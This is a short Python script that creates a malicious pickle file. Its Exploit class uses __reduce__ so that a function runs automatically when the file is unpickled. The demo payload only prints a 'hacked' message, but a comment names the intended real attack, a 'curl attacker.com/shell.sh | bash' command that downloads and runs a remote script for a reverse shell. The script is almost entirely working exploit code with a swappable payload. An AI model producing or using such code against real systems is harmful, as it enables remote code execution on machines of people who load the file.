import pickle
import os

# Define a function for the malicious payload (e.g., print a message; in a real attack, this could be os.system('malicious command'))
def malicious_payload():
    print("you have been hacked")
    # Real attack: os.system("curl attacker.com/shell.sh | bash") or similar for reverse shell

# Exploit class that triggers the payload on unpickling
class Exploit:
    def __reduce__(self):
        return (malicious_payload, ())  # Returns a callable and its args to execute on load

# Serialize the exploit object
with open('malicious.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)

print("Malicious file created: malicious.pkl")